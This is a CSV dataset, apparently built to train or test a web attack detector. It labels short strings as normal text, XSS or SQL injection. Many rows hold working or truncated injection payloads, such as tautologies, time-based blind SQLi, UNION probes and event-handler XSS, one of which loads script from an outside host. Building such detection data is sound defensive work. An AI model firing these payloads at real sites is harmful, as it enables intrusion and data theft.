Payload,Label,text_label,ID
1'|| ( select 'pvmz' from dual where 1090 = 1090 p,2,SQLi,14150
She planted beautiful flowers in her garden.,0,normal,22899
1' and 9660 = ( select count ( * ) from all_users ,2,SQLi,17550
1' ) ) as cjjm where 1981 = 1981,2,SQLi,14804
"1%' or ( select 9173 from ( select count ( * ) ,co",2,SQLi,19964
"1"" where 3933 = 3933 or extractvalue ( 1297,concat",2,SQLi,16172
"1%"" ) ) and 3707 = ( select count ( * ) from sysib",2,SQLi,12288
"select * from users where id = 1. union select 1,b",2,SQLi,11857
"<input oncontextmenu=""alert(1)"">test</input>",1,XSS,5064
-7770' where 6503 = 6503 or 2724 in ( ( char ( 113,2,SQLi,15785
Select teach.,0,normal,24712
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10486
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10729
"<style>@keyframes x{}</style><video style=""animati",1,XSS,8032
"{""id"":null,""name"":""stage""}",0,normal,26964
"1"" ) or ( select * from ( select ( sleep ( 5 ) ) )",2,SQLi,18579
"1 ) procedure analyse ( extractvalue ( 9255,concat",2,SQLi,17206
"-2373%"" ) or 9323 = 9323#",2,SQLi,18407
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><,1,XSS,2500
"{""id"":null,""name"":""BlackWarGreymon""}",0,normal,27135
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( ",2,SQLi,16068
I want to choose a color for the walls.,0,normal,23840
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10661
<marquee id=x tabindex=1 onfocus=alert(1)></marque,1,XSS,6954
"<summary onbeforepaste=""alert(1)"" contenteditable>",1,XSS,4205
"In the top toolbar, select ""Go"" and then ""Go to Fo",0,normal,25991
1 or pg_sleep(5)--,2,SQLi,10365
"<menuitem onbeforepaste=""alert(1)"" contenteditable",1,XSS,5567
"1' where 7688 = 7688 union all select null,null,nu",2,SQLi,16357
1 ) where 8474 = 8474 or 5356 = ( select count ( *,2,SQLi,20801
"<blockquote onpaste=""alert(1)"" contenteditable>tes",1,XSS,8579
<animate onpointerout=alert(1)>XSS</animate>,1,XSS,2257
Modify your style.,0,normal,22793
"1"" or 8421 = ( select count ( * ) from generate_se",2,SQLi,21767
1'|| ( select 'yhpe' where 8010 = 8010 rlike ( sel,2,SQLi,20821
"1"" where 2677 = 2677 and ( select * from ( select ",2,SQLi,14910
declare @q nvarchar ( 200 ) select @q = 0x77006100,2,SQLi,11475
"AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1",2,SQLi,11308
"-9379 ) or make_set ( 9354 = 9354,7185 ) and ( 921",2,SQLi,20729
Sort the color-coded folders.,0,normal,22700
"<big onmouseout=""alert(1)"">test</big>",1,XSS,7562
"Just select ""Trackpad,"" which appears under ""Hardw",0,normal,25929
"1' ) union all select null,null,null,null,null,nul",2,SQLi,15521
"<dfn onbeforepaste=""alert(1)"" contenteditable>test",1,XSS,6351
select,0,normal,26629
1' ) ) or 5286 = ( select count ( * ) from all_use,2,SQLi,17406
<legend onpointerover=alert(1)>XSS</legend>,1,XSS,8780
<svg><area onload=alert(1)></area>,1,XSS,2766
They select the best candidates.,0,normal,24461
1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ,2,SQLi,13596
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,1809
"1 where 1992 = 1992 union all select null,null--",2,SQLi,13744
"<style>@keyframes x{}</style><frameset style=""anim",1,XSS,7920
Create a striking artwork.,0,normal,22663
"<optgroup draggable=""true"" ondragleave=""alert(1)"">",1,XSS,5306
"-4076' ) ) union all select 9030,9030,9030,9030,90",2,SQLi,12365
"{""id"":null,""firstName"":""Jimmy"",""lastName"":""Ng"",""sp",0,normal,26753
"-2325 ) union all select 4692,4692,4692,4692#",2,SQLi,15125
"1"" and 6510 = ( select count ( * ) from sysusers a",2,SQLi,20382
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,5132
"<link oncut=""alert(1)"" contenteditable>test</link>",1,XSS,3696
"))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AN",2,SQLi,11293
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&l,1,XSS,1416
)) or sleep(5)=,2,SQLi,10359
Where's my missing sock?,0,normal,22556
<style>:target {color: red;}</style><u id=x style=,1,XSS,1914
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10442
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10430
"; if not(substring((select @@version),25,1) <> 0) ",2,SQLi,11132
1 and 6414 = ( select count ( * ) from rdb$fields ,2,SQLi,15863
<select onchange=alert(1)><option>1<option>2,1,XSS,9302
1 ) as nlig where 5964 = 5964 and 2388 = benchmark,2,SQLi,16749
( select * from ( select ( sleep ( 5 ) ) ) srmq ) ,2,SQLi,21549
"1 ) ) ) union all select null,null,null#",2,SQLi,19581
<datalist onpointerdown=alert(1)>XSS</datalist>,1,XSS,3226
"1' ) union all select null,null--",2,SQLi,17357
1'|| ( select 'xhcr' from dual where 9279 = 9279,2,SQLi,13319
"1"" ) ) union all select null,null,null,null,null--",2,SQLi,21035
"<foreignObject xlink:href=""javascript:alert(88)""/>",1,XSS,9172
"<content draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,2441
"-8117' union all select 9945,9945,9945,9945,9945,9",2,SQLi,16192
"<element onmouseenter=""alert(1)"">test</element>",1,XSS,3264
if ( 8812 = 7896 ) select 8812 else drop function ,2,SQLi,21269
"<img LOWSRC=""javascript:document.vulnerable=true;""",1,XSS,1490
1 or 8315 = ( select count ( * ) from sysibm.systa,2,SQLi,13941
"<style>:target {color:red;}</style><p id=x style=""",1,XSS,2197
"""></title><script>alert(1111)</script>",1,XSS,1327
"jaVasCript:/*`/*\`/*'/*\""//""/**/(onload=alert())//",1,XSS,9528
"<;SCRIPT "";a=';>;';""; SRC="";http://ha.ckers.org/xs",1,XSS,1663
or uname like '%,2,SQLi,10016
"-8013%"" or 1570 = convert ( int, ( select char ( 1",2,SQLi,19766
"{""id"":null,""name"":""excited bare sang""}",0,normal,27266
"-2667 ) union all select 5848,5848,5848,5848--",2,SQLi,16726
"-3349 ) ) ) union all select 6553,6553#",2,SQLi,12440
"1"" ) ) ( select ( case when ( 5451 = 5451 ) then r",2,SQLi,15582
1'|| ( select 'qwoo' from dual where 8802 = 8802 o,2,SQLi,14005
-1648 ) ) as oqqy where 3459 = 3459 or 6872 = 6872,2,SQLi,14560
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10498
"<del onmousedown=""alert(1)"">test</del>",1,XSS,5724
<small onpointerout=alert(1)>XSS</small>,1,XSS,8460
<sVg><scRipt >alert&lpar;1&rpar; {Opera},1,XSS,1252
"1' ) ) ) procedure analyse ( extractvalue ( 9627,c",2,SQLi,15193
Calculate totals where required.,0,normal,23342
<link onpointerdown=alert(1)>XSS</link>,1,XSS,4448
<col onpointermove=alert(1)>XSS</col>,1,XSS,5119
<br onpointerenter=alert(1)>XSS</br>,1,XSS,8445
"<a oncontextmenu=""alert(1)"">test</a>",1,XSS,6778
1'|| ( select 'xyft' from dual where 8250 = 8250 a,2,SQLi,13441
"<em onclick=""alert(1)"">test</em>",1,XSS,2006
"select * from users where id = 1 or ""1#"" or 1 = 1 ",2,SQLi,11702
"In a primary, voters select one candidate on a bal",0,normal,26016
"<style onpaste=""alert(1)"" contenteditable>test</st",1,XSS,5538
-4882' order by 1#,2,SQLi,19609
Select follow.,0,normal,24659
<img id=x tabindex=1 onactivate=alert(1)></img>,1,XSS,3877
"1"" ) as kndn where 9314 = 9314",2,SQLi,13598
"1"" ) ) as vdbf where 7969 = 7969 or extractvalue (",2,SQLi,12091
1' where 7882 = 7882 and 6663 = 4524--,2,SQLi,16557
"<tt onmousedown=""alert(1)"">test</tt>",1,XSS,5862
<title id=x tabindex=1 onactivate=alert(1)></title,1,XSS,5554
#ERROR!,2,SQLi,11362
Select the best candidate for the job.,0,normal,24116
1 ) as idvt where 3490 = 3490 and 9660 = ( select ,2,SQLi,18749
"""),NULL)%20waitfor%20delay%20'0:0:20'%20--",2,SQLi,10864
1' where 9206 = 9206,2,SQLi,21948
"<nobr onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,5839
"1%"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( ",2,SQLi,20831
1'+ ( select enzd where 6046 = 6046 and ( 3020 = 3,2,SQLi,15292
"<mark onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,6919
Filter the spam.,0,normal,22815
<map onpointerout=alert(1)>XSS</map>,1,XSS,3117
"-9854%"" ) ) ) or 6455 = 3652",2,SQLi,15792
1'|| ( select 'yhkt' from dual where 7105 = 7105 o,2,SQLi,18665
"or username like char ( 37 ) ,",2,SQLi,11508
"1"" where 9461 = 9461",2,SQLi,21005
<td onpointerout=alert(1)>XSS</td>,1,XSS,7728
"<noembed draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,6251
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) a,2,SQLi,14806
"This contest will select 20 finalists, who will ge",0,normal,25303
<style onpointerenter=alert(1)>XSS</style>,1,XSS,3248
{},0,normal,26800
"<p onclick=""alert(1)"">test</p>",1,XSS,3354
><script+src=https://api.cmi.aol.com/content/alert,1,XSS,9799
"select * from users where id = 1 or "".%"" or 1 = 1 ",2,SQLi,11560
"{""id"":null,""name"":""base""}",0,normal,27126
"1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 5",2,SQLi,14158
"{""id"":null,""name"":""women""}",0,normal,27542
"1"" ) ) as qvyu where 5962 = 5962 or updatexml ( 18",2,SQLi,12478
1' or exp ( ~ ( select * from ( select concat ( 0x,2,SQLi,19501
<sup onpointermove=alert(1)>XSS</sup>,1,XSS,5739
"-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 297",2,SQLi,14236
"-9142%"" ) ) ) or 1570 = convert ( int, ( select ch",2,SQLi,21663
<a id=x tabindex=1 onactivate=alert(1)></a>,1,XSS,4156
"<meta onmouseleave=""alert(1)"">test</meta>",1,XSS,4811
select sleep ( 5 ) ) ||',2,SQLi,14962
Containing select cases adjudged in the King's ben,0,normal,26267
"<set attributeName=""xlink:href"" begin=""accessKey(c",1,XSS,9306
Where's the arena?,0,normal,23539
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",2,SQLi,10514
"1%"" ) ) and 7533 = 7533 and ( ( ""%"" = """,2,SQLi,12218
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERI",1,XSS,1040
1' ) ) as hbdi where 6758 = 6758 and elt ( 1210 = ,2,SQLi,18905
"),NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0",2,SQLi,10893
"{""id"":null,""name"":""Kakuna""}",0,normal,26763
<keygen id=x tabindex=1 onbeforeactivate=alert(1)>,1,XSS,3641
javas<!-- -->cript:alert(''),1,XSS,5223
"<tfoot onmousedown=""alert(1)"">test</tfoot>",1,XSS,5143
"UNION ALL SELECT 1,2,3",2,SQLi,10507
"-2384%' ) ) union all select 2467,2467,2467,2467#",2,SQLi,17489
"1"" where 8483 = 8483 or char ( 117 ) ||char ( 111 ",2,SQLi,21613
"admin"") or ""1""=""1",2,SQLi,9939
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10496
-5064 ) as mzxc where 1889 = 1889 or 1570 = conver,2,SQLi,17704
1' ) as wquy where 2518 = 2518,2,SQLi,19051
Select the ideal location for the event.,0,normal,24109
"<bgsound onkeypress=""alert(1)"" contenteditable>tes",1,XSS,8702
"<a href=""javascript:x='&percnt;27-alert(1)-%27';"">",1,XSS,206
1' ) ) and 3814 = 4272--,2,SQLi,14023
1' ) ) as zbkp where 1720 = 1720 and 4110 = 6748#,2,SQLi,21036
"{""id"":null,""name"":""powerful""}",0,normal,27217
"1 ) ) as gcvw where 7363 = 7363 or row ( 1045,7562",2,SQLi,15053
"1"" ) rlike sleep ( 5 ) #",2,SQLi,19450
"{""id"":null,""firstName"":""Azahari"",""lastName"":""Ab Ma",0,normal,27581
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",2,SQLi,10575
<style>:target {color: red;}</style><figcaption id,1,XSS,8077
1'|| ( select 'djoe' from dual where 8063 = 8063 (,2,SQLi,20658
1 ) where 2930 = 2930,2,SQLi,21423
"<dt onmouseup=""alert(1)"">test</dt>",1,XSS,5386
1' ) where 7561 = 7561 and 8514 = ( select count (,2,SQLi,13114
-5026' or ( 8459 = 8459 ) *4906 and 'uavj' like 'u,2,SQLi,12552
1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ,2,SQLi,18113
"),NULL)%20waifor%20delay%20'0:0:20'%20/*",2,SQLi,10862
<progress id=x tabindex=1 onbeforeactivate=alert(1,1,XSS,3075
<script> document.getElementById(%22safe123%22).cl,1,XSS,9267
"1"" where 5552 = 5552 or 5356 = ( select count ( * ",2,SQLi,17920
<embed id=x tabindex=1 onactivate=alert(1)></embed,1,XSS,7592
Where's the therapist's office?,0,normal,23663
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,11009
"&lt;IMG SRC=\"" javascript&#058;alert('XSS');\""&gt;",1,XSS,1092
Macy's: Super Saturday Sale: Save on select bed an,0,normal,25896
"<legend onmouseover=""alert(1)"">test</legend>",1,XSS,8423
"-1139 ) or 1 group by concat ( 0x7171706a71, ( sel",2,SQLi,18912
"1"" ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||",2,SQLi,12657
1'|| ( select 'fcnb' where 2869 = 2869 or 8315 = (,2,SQLi,17599
<!--[if]><script>javascript:alert(1)</script -->,1,XSS,689
-6512'+ ( select 'zdjx' where 5454 = 5454 order by,2,SQLi,19961
<image id=x tabindex=1 onfocusin=alert(1)></image>,1,XSS,7442
Where's your SQL responsibility?,0,normal,23429
1' ) ) as fcjk where 7755 = 7755,2,SQLi,19020
day,0,normal,23202
-7707' ) ) union all select 3172#,2,SQLi,21271
max,0,normal,23142
"-4327"" or make_set ( 3107 = 1781,1781 ) and ""lclf""",2,SQLi,17408
"<input onkeyup=""alert(1)"" contenteditable>test</in",1,XSS,6437
"1 ) where 8671 = 8671 and make_set ( 4931 = 1642,1",2,SQLi,22127
<input type=radio id=x onfocusin=alert(1)>,1,XSS,7351
"<aside onkeypress=""alert(1)"" contenteditable>test<",1,XSS,7500
"<abbr onbeforecopy=""alert(1)"" contenteditable>test",1,XSS,3977
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10627
<img src=validimage.png onload=alert(1)>,1,XSS,3061
"select * from users where id = 1 or ""$?"" or 1 = 1 ",2,SQLi,11645
"His knowledge of the ancient authors was wide, but",0,normal,26097
"<meter onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,3471
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3982
<button onDragDrop=javascript:alert(1)>,1,XSS,9604
"{""id"":null,""firstName"":""Lim"",""lastName"":""Lilian"",""",0,normal,27191
"1 ) union all select null,null,null,null,null--",2,SQLi,20642
<dl onpointerenter=alert(1)>XSS</dl>,1,XSS,7408
"The cost of these works had been underestimated, a",0,normal,25466
<frameset><frame id=x onfocusin=alert(1)>,1,XSS,6382
"Police can, optionally, select a date range they w",0,normal,25768
Can you help me decide where to travel next?,0,normal,23803
<noembed onpointerout=alert(1)>XSS</noembed>,1,XSS,1771
"<body onkeydown=""alert(1)"" contenteditable>test</b",1,XSS,7100
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,4467
1' ) ) as ewyk where 4828 = 4828 and ( select 2* (,2,SQLi,14618
"-2131"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +",2,SQLi,13273
Select make.,0,normal,24565
"<small onmouseup=""alert(1)"">test</small>",1,XSS,8335
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3714
"1"" ) and updatexml ( 3393,concat ( 0x2e,0x7171706a",2,SQLi,22324
"1%' ) and 3202 = like ( 'abcdefg',upper ( hex ( ra",2,SQLi,15540
"1' ) ) as xntz where 5801 = 5801 or row ( 1045,756",2,SQLi,12602
1'+ ( select 'toec' where 5810 = 5810 and sleep ( ,2,SQLi,14642
"<style>@keyframes x{}</style><input style=""animati",1,XSS,4010
<x onxxx=alert(1) 1=',1,XSS,9358
1' ) or exp ( ~ ( select * from ( select concat ( ,2,SQLi,19471
<a href=javascript&colon;alert&lpar;document&perio,1,XSS,885
( select ( case when ( 6986 = 6986 ) then 6986 els,2,SQLi,18473
"1 where 5627 = 5627 and 3202 = like ( 'abcdefg',up",2,SQLi,16606
"{""id"":null,""firstName"":""Li"",""lastName"":""Er"",""addre",0,normal,26904
"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 1",2,SQLi,21492
"<blockquote onkeydown=""alert(1)"" contenteditable>t",1,XSS,5210
",NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--",2,SQLi,10866
"1"" ) procedure analyse ( extractvalue ( 9255,conca",2,SQLi,19070
1%' ) ) ) and ( select * from ( select ( sleep ( 5,2,SQLi,21055
"<label onkeydown=""alert(1)"" contenteditable>test</",1,XSS,4839
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--,2,SQLi,10409
"1"" ) and 6240 = ( 'qqpjq'|| ( select case 6240 whe",2,SQLi,21865
"<tbody onclick=""alert(1)"">test</tbody>",1,XSS,8488
Where's the SQL manual?,0,normal,23403
<main onpointerover=alert(1)>XSS</main>,1,XSS,3829
1' ) and ( 3020 = 3020 ) *6703 and ( 'lhfa' = 'lhf,2,SQLi,21876
1 ) where 6116 = 6116 and 4386 = utl_inaddr.get_ho,2,SQLi,21216
1 ) ) as fwru where 5262 = 5262 and 4241 = convert,2,SQLi,18716
"<head onmousedown=""alert(1)"">test</head>",1,XSS,7766
index,0,normal,23113
<content onpointerover=alert(1)>XSS</content>,1,XSS,5415
-4557%' ) ) or 4537 = 3401 and ( ( '%' = ',2,SQLi,18090
",(select%20if(count(*)!=-1,benchmark(3000000,MD5(1",2,SQLi,11011
1 where 8506 = 8506,2,SQLi,12867
"-4983%"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ",2,SQLi,20961
"<dl onmousemove=""alert(1)"">test</dl>",1,XSS,4129
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)",1,XSS,609
"<hr onclick=""alert(1)"">test</hr>",1,XSS,5026
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8668
"/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCg",1,XSS,7420
"1%' union all select null,null,null,null,null,null",2,SQLi,13043
Since you're using object-specific overprint optio,0,normal,25544
<nobr onpointerleave=alert(1)>XSS</nobr>,1,XSS,5171
&#000060,1,XSS,1068
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",1,XSS,6537
Select study.,0,normal,24719
Where's the fire department?,0,normal,23510
1'+ ( select 'kcix' where 1117 = 1117,2,SQLi,18753
"-9272%"" ) ) ) or 4493 = utl_inaddr.get_host_addres",2,SQLi,17236
"Go to the Games & Apps menu, and then select ""Game",0,normal,26139
1' ) and sleep ( 5 ) and ( 'njud' = 'njud,2,SQLi,14982
<caption onblur=alert(1) tabindex=1 id=x></caption,1,XSS,6665
<svg onload=setInterval(function(){with(document)b,1,XSS,9312
"<iframe onkeyup=""alert(1)"" contenteditable>test</i",1,XSS,5394
"1"" where 7290 = 7290 union all select null,null,nu",2,SQLi,19360
"<bdo onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,4744
A range of intelligence will be used to select the,0,normal,26433
1' ) ) or 8156 = ( select count ( * ) from generat,2,SQLi,12085
I'm thinking of where to have a family outing.,0,normal,23799
"1"" and make_set ( 8403 = 8403,8899 )",2,SQLi,14512
</br style=a:expression(alert())>,1,XSS,1320
<button onRowInserted=javascript:alert(1)>,1,XSS,9661
1 exec sp_ ( or exec xp_ ),2,SQLi,12057
"ABC<div style=""x:\xC2\xA0expression(javascript:ale",1,XSS,471
"1' ) ) ) and 4241 = convert ( int, ( select char (",2,SQLi,21784
1' where 9961 = 9961 and 8514 = ( select count ( *,2,SQLi,16268
"1"" ) ) ) and ( select 9067 from ( select count ( *",2,SQLi,16668
"-5622"" where 7970 = 7970 union all select 7970,797",2,SQLi,13532
"1%"" or 8384 = like ( 'abcdefg',upper ( hex ( rando",2,SQLi,18154
"<menu onkeydown=""alert(1)"" contenteditable>test</m",1,XSS,5295
"-8950"" ) ) as uahs where 2113 = 2113 union all sel",2,SQLi,12367
"-9848' union all select 1359,1359,1359,1359,1359,1",2,SQLi,17222
<image2 onpointerleave=alert(1)>XSS</image2>,1,XSS,2414
Select the best project.,0,normal,24320
Delete the old bookmarks.,0,normal,22637
"1%' union all select null,null,null,null,null,null",2,SQLi,14692
1' and sleep ( 5 ) and 'kapr' = 'kapr,2,SQLi,20599
"<bdi onbeforecut=""alert(1)"" contenteditable>test</",1,XSS,3124
Who Should select Senators?,0,normal,25127
"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' =",2,SQLi,14517
1' ) where 8142 = 8142 waitfor delay '0:0:5'--,2,SQLi,19673
--></title></textarea></style></noscript></noembed,1,XSS,9488
<style>:target {transform: rotate(180deg);}</style,1,XSS,3666
"{""id"":null,""firstName"":""Tan"",""lastName"":""Jingheng""",0,normal,27184
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706",2,SQLi,20245
"<link oncontextmenu=""alert(1)"">test</link>",1,XSS,8912
1%' ) ) ) or 6793 = ( select 6793 from pg_sleep ( ,2,SQLi,16902
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10771
1 ) rlike sleep ( 5 ) #,2,SQLi,12520
1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR,2,SQLi,11340
Insert the SIM card.,0,normal,22643
The Eurail Select Pass is the most flexible pass t,0,normal,25453
"{""id"":null,""name"":""production""}",0,normal,27085
"<code onmouseleave=""alert(1)"">test</code>",1,XSS,6838
Select your proposal.,0,normal,24945
<script>Object.prototype['*'] = ['onload']</script,1,XSS,226
<content onpointerenter=alert(1)>XSS</content>,1,XSS,3638
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,4537
"-5763' ) ) ) union all select 1640,1640,1640,1640,",2,SQLi,21854
Select pizza.,0,normal,24494
1%' waitfor delay '0:0:5' and '%' = ',2,SQLi,14074
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,6800
1' ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ),2,SQLi,20969
"1"" where 3318 = 3318",2,SQLi,20896
1' ) and 7533 = 7533 and ( 'dbjq' = 'dbjq,2,SQLi,15255
Select venue.,0,normal,24543
1' or '1'='1,2,SQLi,10057
1 ) ) ) or 8421 = ( select count ( * ) from genera,2,SQLi,22392
<datalist onfocusout=alert(1) tabindex=1 id=x></da,1,XSS,3787
1'|| ( select 'lvso' where 5675 = 5675,2,SQLi,19469
"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$f",2,SQLi,12983
<SCRIPT SRC=http://.rocks/.js?< B >,1,XSS,8106
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>,1,XSS,6296
"-7337"" union all select 7294,7294,7294,7294,7294,7",2,SQLi,15423
"1"" ) ) as wooq where 7671 = 7671 and row ( 6237,74",2,SQLi,22182
"-9721' or elt ( 9511 = 9238,9238 )",2,SQLi,17821
select ( case when ( 4935 = 4734 ) then 4935 else ,2,SQLi,17239
ORDER BY 20#,2,SQLi,10293
"1"" ) ) and 7533 = 7533 and ( ( ""rnni"" like ""rnni",2,SQLi,12796
"<data onmouseenter=""alert(1)"">test</data>",1,XSS,8307
"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:",2,SQLi,20668
<script onpointerleave=alert(1)>XSS</script>,1,XSS,8766
